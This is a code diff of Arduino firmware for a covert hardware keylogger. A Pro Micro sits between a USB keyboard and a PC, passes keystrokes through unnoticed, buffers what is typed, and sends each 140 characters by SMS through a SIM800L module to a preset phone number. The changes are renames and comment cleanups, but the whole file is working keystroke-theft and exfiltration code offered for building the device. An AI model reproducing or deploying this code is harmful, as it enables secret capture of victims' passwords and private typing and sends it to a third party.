@@ -2,13 +2,12 @@
 /*
     The wiring could be flexible because it relies on SoftwareSerial.
     The wiring used with the code below is:
-
     [ Pro Micro 5V   ->  sim800L ]
                 8    ->  SIM_TXD
                 9    ->  SIM_RXD
                 VCC  ->  5V
                 GND  ->  GND
-                GND  ->  2nd GND
+            2nd GND  ->  2nd GND
     
     [ Pro Micro 5V   ->   Usb Host Mini Board ]   // Vertical lines indicate that the connection is made on the same module
              GND    ->    0V (GND)
@@ -26,16 +25,14 @@
          10K resistor
               |
              GND
-
     Possible design (pictures lack pin 3 -> SS pin connection): 
     https://cdn.discordapp.com/attachments/417291555146039297/417340199379533824/b.jpg
     https://cdn.discordapp.com/attachments/417291555146039297/417340239942778880/c.jpg
-
     Make sure to read the comments below regarding sim800L baud rate. It has essential information required to make it work.
 */
 
 /* USER BASIC + ESSENTIAL SETTINGS */
-#define PHONE_RECEIVER_NUMBER "+44000000000"
+#define PHONE_RECEIVER_NUMBER "+440000000000"
 #define CHAR_LIMIT 140 // number of characters before it sends sms (shouldn't be more than 150)
 /* 
     The serial connection speed below (for the SIM800L) heavily impacts how fast the sms are sent. The higher value = the faster speed.
@@ -77,22 +74,21 @@
 
 /* END OF SETTINGS */
 
-
 #ifdef SERIAL_DEBUG // before compiling the code Arduino will check wether the "#define SERIAL_DEBUG" was present and depending on that the custom serial print function will actually print things or do nothing
   /* 
-     The lines below make Serial_print() function have the same functionality as the original Serial.print()
+     The lines below make S_print() function have the same functionality as the original Serial.print()
      Someone could ask why create another function instead of using original one, it's created for the 
      comfort of the developer who can toggle all the debugging output by commenting out a single line.
      Otherwise it would be necessary to comment out all the Serial.print() calls which would take time and effort. 
      This way all that has to be done to toggle the output is to uncomment or comment out the "#define SERIAL_DEBUG" line.
   */
-  #define Serial_begin(x) Serial.begin(x) // now when Serial_begin will be used it will do exactly the same as the original Serial.begin
-  #define Serial_print(x) Serial.print(x)
-  #define Serial_println(x) Serial.println(x)
+  #define S_begin(x) Serial.begin(x) // now when Serial_begin will be used it will do exactly the same as the original Serial.begin
+  #define S_print(x) Serial.print(x)
+  #define S_println(x) Serial.println(x)
 #else // else define these functions as empty, so they will do nothing if the "#define SERIAL_DEBUG" line is not present above (e.g. if it's commented out)
-  #define Serial_begin(x)  // now Serial_begin function does nothing and doesn't even have to be deleted from any other part of the code, it can just stay there because it will do nothing
-  #define Serial_println(x)
-  #define Serial_print(x)
+  #define S_begin(x)  // now Serial_begin function does nothing and doesn't even have to be deleted from any other part of the code, it can just stay there because it will do nothing
+  #define S_println(x)
+  #define S_print(x)
 #endif
 
 #include "Keyboard.h" // library that contains all the HID functionality necessary pass-on the typed and logged keys to the PC
@@ -101,8 +97,8 @@
     "Not all pins on the Leonardo and Micro support change interrupts, so only the following can be used for RX: 8, 9, 10, 11, 14 (MISO), 15 (SCK), 16 (MOSI)." 
     (see: https://www.arduino.cc/en/Reference/SoftwareSerial)
 */ 
-SoftwareSerial KeyboardSerial(15, 14); //communication with USB host board (receiving input from keyboard)
-SoftwareSerial SmsSerial(8, 9); //communication with sim800L
+SoftwareSerial USBhost(15, 14); //communication with USB host board (receiving input from keyboard)
+SoftwareSerial Sim800L(8, 9); //communication with sim800L
 
 
 /*
@@ -111,19 +107,16 @@ SoftwareSerial SmsSerial(8, 9); //communication with sim800L
     it will also have to know what message to output to the Serial Monitor. These are 3 different values,
     someone could create a big chunk of "else if" statements or put all the information into concise 
     structure, loop through each item, do appropriate checks and trigger relevant actions. 
-
     Instead of 3 arrays like:
     byte bytesReceived[] = {0x49, 0x51, etc...};
     byte keysToPress[] = {KEY_PAGE_UP, KEY_PAGE_DOWN, etc...};
     char* keyNamesToPrint[] = {"[PgUp]", "[PgDn]", etc...};
-
     We have a single struct like:   
     EscapedKey escapedKeysData[] = {
       0x49, KEY_PAGE_UP, "[PgUp]",
       0x51, KEY_PAGE_DOWN, "[PgDn]",
       etc...
       };
-
     Which can later be accessed like:
     escapedKeysData[5].correspondingByte  // 6th element of that array (that is actually 0x53)
     escapedKeysData[5].pressedkey         // 6th element of that array (that is actually KEY_DELETE)
@@ -181,7 +174,7 @@ EscapedKey altCombined_F_Keys[] = {
 };
 
 char flag_esc = 0; // variable changed depending on the value received from USB host board that indicates the use of "escaped character" (like Page-up, Page-down, Up-arrow, etc.) 
-char TextSms[CHAR_LIMIT+2]; // + 2 for the last confirming byte sim800L requires
+char TextSms[CHAR_LIMIT+2]; // + 2 for the last confirming byte sim800L requires to either confirm (byte 26) or discard (byte 27) new sms message
 int char_count; // how many characters were "collected" since turning device on (or since last sms was sent)
 char sms_cmd[40]; // it will contain the command that will be sent to the USB host board, phone input is located at the top of the code so it's easily changable but requires an array of chars to be declared before merging the phone number with remaining part of the command
 #define SIM800L_RESPONSE_MAX_LENGTH 70
@@ -195,13 +188,12 @@ unsigned short keyRepetitionCount;
 
 
 void setup() {
-  Serial_begin(BAUD_RATE_SERIAL_DEBUGGING); // begin serial communication with PC (so Serial Monitor could be opened and the developer could see what is actually going on in the code) 
-  KeyboardSerial.begin(BAUD_RATE_USB_HOST_BOARD); // begin serial communication with USB host board in order to receive key bytes from the keyboard connected to it
-  SmsSerial.begin(BAUD_RATE_SIM800L); // begin serial communication with the sim800L module to let it know (later) to send an sms 
-  SmsSerial.println("AT+CMGF=1"); // AT+CMGF command sets the sms mode to "text" (see 113th page of https://www.elecrow.com/download/SIM800%20Series_AT%20Command%20Manual_V1.09.pdf)
+  S_begin(BAUD_RATE_SERIAL_DEBUGGING); // begin serial communication with PC (so Serial Monitor could be opened and the developer could see what is actually going on in the code) 
+  USBhost.begin(BAUD_RATE_USB_HOST_BOARD); // begin serial communication with USB host board in order to receive key bytes from the keyboard connected to it
+  Sim800L.begin(BAUD_RATE_SIM800L); // begin serial communication with the sim800L module to let it know (later) to send an sms 
+  Sim800L.println("AT+CMGF=1"); // AT+CMGF command sets the sms mode to "text" (see 113th page of https://www.elecrow.com/download/SIM800%20Series_AT%20Command%20Manual_V1.09.pdf)
   Keyboard.begin(); // start HID functionality, it will allow to type keys to the PC just as if there was no keylogger at all
-  Serial_print("ready");
-  KeyboardSerial.listen(); // only 1 software serial can be listening at the time, by default the last initialized serial is listening (by using softserial.begin())
+  USBhost.listen(); // only 1 software serial can be listening at the time, by default the last initialized serial is listening (by using softserial.begin())
   pinMode(DIGITAL_PIN_KEYUP_KEYDOWN_STATE, INPUT);
 }
 
@@ -214,17 +206,16 @@ void loop() {
 
 
 /* ------------------------------------------------------------------------------------------------------------
-
     USB host board stuff
   
  */
 
 void HandlingUSBhostBoard() { // function responsible for collecting, storing keystrokes from USB host board, it also is "passing" keystrokes to PC 
-  if (KeyboardSerial.available() > 0) { // check if any key was pressed     
+  if (USBhost.available() > 0) { // check if any key was pressed     
     lastKeyPressedTime = millis();
     wasLastKeyDebounced = false;
-    byte inByte = KeyboardSerial.read(); // read the byte representing that key
-    //Serial_print(inByte); Serial_print(" - "); Serial_println((char)inByte);
+    byte inByte = USBhost.read(); // read the byte representing that key
+    //S_print(inByte); S_print(" - "); S_println((char)inByte);
     if (inByte == 27){flag_esc = 1; keysCountAfterEscapedKey = 0;} // if 27 key was pressed then do nothing
     else {
       ApplyActionForKeyByte(inByte, flag_esc);
@@ -248,14 +239,14 @@ void HandlingUSBhostBoard() { // function responsible for collecting, storing ke
   }
 
   //If byte 27 was received alone (without any immediate following byte) then the function below will type the Esc key and print it 
-  ActualEscKeyFix(lastKeyPressedTime);
+  EscKeyFix(lastKeyPressedTime);
 }
 
-void ActualEscKeyFix(unsigned long lastKeyPressedTime){
+void EscKeyFix(unsigned long lastKeyPressedTime){
   if(flag_esc == 1){
     if(millis() - lastKeyPressedTime > 50){
       flag_esc = 0;
-      Serial_println("[Esc]");
+      S_println(F("[Esc]"));
       Keyboard.press(KEY_ESC);
       delay(DELAY_BEFORE_RELEASING_KEYS);
       Keyboard.releaseAll();    
@@ -267,25 +258,25 @@ void ActualEscKeyFix(unsigned long lastKeyPressedTime){
 void ApplyActionForKeyByte(byte inByte, byte flag_state){
   if (flag_state == 1) {
     // Previous char was ESC - Decode all the escaped keys
-    PrintOrPressEscapedKey(inByte); // prints but doesn't type
+    PressEscapedKey(inByte); // prints but doesn't type
     flag_esc = 0;
   }
   else {
-    Serial_print(inByte); Serial_print(" - "); Serial_println((char)inByte); // debug line
+    S_print(inByte); S_print(" - "); S_println((char)inByte); // debug line
     
     if ((inByte >= 1 && inByte <= 26) && (inByte < 8 || inByte > 10) && inByte != 13) { // for all of the Control+someChar
       // >= stands for "higher or equal"
       // && stands for "and"
       // || stands for "or"
-      Serial_print(F("Control+"));
-      Serial_println((char)(inByte + 96)); // 1 for a + 96 gives 97 which is ascii value for it, the same happens for all the other characters from a to z
+      S_print(F("Control+"));
+      S_println((char)(inByte + 96)); // 1 for a + 96 gives 97 which is ascii value for it, the same happens for all the other characters from a to z
       Keyboard.press(ctrlKey);
       Keyboard.press((char)(inByte + 96));
       delay(DELAY_BEFORE_RELEASING_KEYS);
       Keyboard.releaseAll();
     }
     else if (inByte == 8) {
-      Serial_println(F("Backspace"));
+      S_println(F("Backspace"));
       char_count--; //This is for that backspaced stuff is non important in the array
       if(char_count < 0){char_count = 0;} // otherwise index could be negative if backspace was repeatedly pressed
       Keyboard.press(KEY_BACKSPACE);
@@ -293,10 +284,10 @@ void ApplyActionForKeyByte(byte inByte, byte flag_state){
       Keyboard.releaseAll();
     }
     else if (inByte == 9) {
-      Serial_println(F("^T"));
+      S_println(F("^T"));
       TextSms[char_count] = '^';
       char_count++;
-      if(char_count > CHAR_LIMIT - 3){Serial_println("Warning: TAB (2 bytes) could overwrite 1 of the last characters...");}
+      if(char_count > CHAR_LIMIT - 3){S_println(F("Warning: TAB (2 bytes) could overwrite 1 of the last characters..."));}
       TextSms[char_count] = 'T';
       Keyboard.press(KEY_TAB);
       delay(DELAY_BEFORE_RELEASING_KEYS);
@@ -304,7 +295,7 @@ void ApplyActionForKeyByte(byte inByte, byte flag_state){
     }
     //10 is just left
     else if (inByte == 13) {
-      Serial_println(F("Enter"));
+      S_println(F("Enter"));
       Keyboard.press((char)inByte);
       delay(DELAY_BEFORE_RELEASING_KEYS);
       Keyboard.releaseAll();
@@ -319,11 +310,15 @@ void ApplyActionForKeyByte(byte inByte, byte flag_state){
   }
 }
 
-void PrintOrPressEscapedKey(byte inByte){
-  // print only
+void PressEscapedKey(byte inByte){
+  /*
+      Loop for page up, page down, etc. (http://www.hobbytronics.co.uk/usb-host-keyboard)
+      "Special 2-character key combinations
+      First Character is Escape (27 [0x1B]) followed by..."
+  */
   for (byte i = 0; i < sizeof(escapedKeysData) / sizeof(EscapedKey); i++) {
     if (inByte == escapedKeysData[i].correspondingByte) {
-      Serial_println(escapedKeysData[i].loggedText);
+      S_println(escapedKeysData[i].loggedText);
       Keyboard.press(escapedKeysData[i].pressedKey);
       delay(DELAY_BEFORE_RELEASING_KEYS);
       Keyboard.releaseAll();
@@ -331,11 +326,11 @@ void PrintOrPressEscapedKey(byte inByte){
     }
   }
 
-  // alt based (type to PC)
+  // Loop for alt combined a-z keys (http://www.hobbytronics.co.uk/download/usb_host_keyboard_codes.txt)
   for (byte i = 0; i < sizeof(altCombined_CharSymbols); i++) {
     if (inByte == altCombined_CharSymbols[i]){
-      Serial_print(F("Alt+"));
-      Serial_println((char)(i + 97)); // 0+97 for a gives 97 which is ascii value for it, the same happens for all the other characters from a to z
+      S_print(F("Alt+"));
+      S_println((char)(i + 97)); // 0+97 for a gives 97 which is ascii value for it, the same happens for all the other characters from a to z
       Keyboard.press(KEY_LEFT_ALT);
       Keyboard.press((char)(i + 97));
       delay(DELAY_BEFORE_RELEASING_KEYS);
@@ -344,9 +339,10 @@ void PrintOrPressEscapedKey(byte inByte){
     }
   }
 
+  // Loop for alt combined F1-F12 keys (http://www.hobbytronics.co.uk/download/usb_host_keyboard_codes.txt)
   for (byte i = 0; i < sizeof(altCombined_F_Keys) / sizeof(EscapedKey); i++) {
     if (inByte == altCombined_F_Keys[i].correspondingByte) {
-      Serial_println(altCombined_F_Keys[i].loggedText);
+      S_println(altCombined_F_Keys[i].loggedText);
       Keyboard.press(KEY_LEFT_ALT);
       Keyboard.press(altCombined_F_Keys[i].pressedKey);
       delay(DELAY_BEFORE_RELEASING_KEYS);
@@ -355,14 +351,13 @@ void PrintOrPressEscapedKey(byte inByte){
     }
   }
 
-  Serial_print(F("[?]"));
+  S_print(F("[?]"));
 }
 
 
 
 
 /* ------------------------------------------------------------------------------------------------------------
-
     sim800L stuff
   
  */
@@ -371,75 +366,69 @@ void HandlingSim800L() {
   if (char_count == CHAR_LIMIT - 1) { // -1 is there because KEY_TAB takes 2 characters to write and if it would be the last pressed key it would write over the range of the array
     unsigned long functionEntryTime = millis();
     
-    SmsSerial.listen();
-    Serial_println("\nSMS with the following content is about to be sent to sim800L: "); Serial_println(TextSms);
+    Sim800L.listen();
+    S_println(F("\nSMS with the following content is about to be sent to sim800L: ")); S_println(TextSms);
     sprintf(sms_cmd, "AT+CMGS=\"%s\"\r\n", PHONE_RECEIVER_NUMBER); // format the sms command (so the number can be easily changed at the top of the code) 
     Send_Sim800L_Cmd(sms_cmd, ">");
     TextSms[char_count] = 26; TextSms[char_count+1] = 0;
-    SmsSerial.print(TextSms); // send additional part which includes the actual text
+    Sim800L.print(TextSms); // send additional part which includes the actual text
     //Send_Sim800L_Cmd(TextSms, "OK");
-    Serial_println("SMS should be sent now, however the code doesn't wait for confirmation because it arrives after too long.");
+    S_println(F("SMS should be sent now, however the code doesn't wait for confirmation because it arrives after too long."));
     char_count = 0; // reset the index of TextSMS[char_count] and start writing to it again with new key-bytes
-    KeyboardSerial.listen();
+    USBhost.listen();
 
-    Serial_print("Sending SMS took: "); Serial_print(millis() - functionEntryTime); Serial_println("ms.");
+    S_print(F("Sending SMS took: ")); S_print(millis() - functionEntryTime); S_println("ms.");
   } 
 }
 
 void Send_Sim800L_Cmd(char* cmd, char* desiredResponsePart){
-  SmsSerial.write(cmd);
-  Serial_println(F("\nThe following command has been sent to sim800L: ")); Serial_println(cmd);
-  Serial_println(F("Waiting for response..."));
+  Sim800L.write(cmd);
+  S_println(F("\nThe following command has been sent to sim800L: ")); S_println(cmd);
+  S_println(F("Waiting for response..."));
   
   if(!Get_Sim800L_Response(sim800L_response, cmd, SIM800L_RESPONSE_TIMEOUT, SIM800L_RESPONSE_KEEP_WAITING_AFTER_LAST_CHAR_RECEIVED)){
-    Serial_print(F("WARNING: No response received within ")); Serial_print(SIM800L_RESPONSE_TIMEOUT); Serial_println("ms.)");
+    S_print(F("WARNING: No response received within ")); S_print(SIM800L_RESPONSE_TIMEOUT); S_println("ms.)");
   }
   else{
-    if(strstr(sim800L_response, desiredResponsePart)){  
-      Serial_println("Response: "); Serial_println(sim800L_response);
+    if(!strstr(sim800L_response, desiredResponsePart)){ 
+      S_println(F("WARNING: Response did not include desired characters.")); 
     }
-    else{
-      Serial_println(F("WARNING: Response did not include desired characters."));
-      Serial_println("Response: "); Serial_println(sim800L_response);
-    }
+    S_println(F("Response: ")); S_println(sim800L_response);
   }
 }
 
-// eg. if(Get_Sim800L_Response(sim800L_response, 1000, 10);){}
+// eg. if(Get_Sim800L_Response(sim800L_response, cmd, 1000, 10);){}
 bool Get_Sim800L_Response(char* response, char* lastCmd,  unsigned short timeout, unsigned short keepCheckingFor) { // timeout = waitForTheFirstByteForThatLongUntilReturningFalse, keepCheckingFor = checkingTimeLimitAfterLastCharWasReceived
   for(byte i=0; i<SIM800L_RESPONSE_MAX_LENGTH; i++){response[i]=0;}  //clear buffer
   
-  unsigned long functionEntryTime = millis(); unsigned long currentTime = millis();
-  while(SmsSerial.available() <= 0){
+  unsigned long functionEntryTime = millis();
+  while(Sim800L.available() <= 0){
     delay(1);
-    currentTime = millis();
-    if(currentTime - functionEntryTime > timeout){
+    if(millis() - functionEntryTime > timeout){
       return false;
     }
   }
 
   byte i=0;
-  byte ignorePreviouslyTypedCommand = 0; // used to ignore the command that was sent in case if it's returned back (which is done by the sim800L...)
-  unsigned long lastByteRec = millis(); currentTime = millis(); // timing functions (needed for reliable reading of the BTserial)
-  while (keepCheckingFor > currentTime - lastByteRec) // if no further character was received during 10ms then proceed with the amount of chars that were already received (notice that "previousByteRec" gets updated only if a new char is received)
-  {      
-    currentTime = millis();   
-    while (SmsSerial.available() > 0 && i < SIM800L_RESPONSE_MAX_LENGTH-1) {
+  byte ignorePreviouslyTypedCommand = 0; // value used to ignore the command that was sent in case if it's returned back (which is done by the sim800L...)
+  unsigned long lastByteRec = millis(); // timing functions (needed for reliable reading of the BTserial)
+  while (keepCheckingFor > millis() - lastByteRec) // if no further character was received during 10ms then proceed with the amount of chars that were already received (notice that "previousByteRec" gets updated only if a new char is received)
+  {         
+    while (Sim800L.available() > 0 && i < SIM800L_RESPONSE_MAX_LENGTH-1) {
       if(i == strlen(lastCmd)){
         if(!strncmp(response, lastCmd, strlen(response)-1)){
           ignorePreviouslyTypedCommand = i+1;
-          //Serial_println("IGNORING_PREVIOUSLY_TYPED_CMD_THAT_IS_RETURNED_FROM_SIM_800L");
+          //S_println("IGNORING_PREVIOUSLY_TYPED_CMD_THAT_IS_RETURNED_FROM_SIM_800L");
           for(byte j=0; j<i; j++){response[j]=0;} // clear that command from response
         }
       }
       byte ind = i - ignorePreviouslyTypedCommand;
       if(ind < 0){ind=0;} 
-      response[ind] = SmsSerial.read(); 
+      response[ind] = Sim800L.read(); 
       i++;
-      lastByteRec = currentTime;
+      lastByteRec = millis();
     }    
     if(i >= SIM800L_RESPONSE_MAX_LENGTH-1){return true;}
   }
   return true;
 }
-
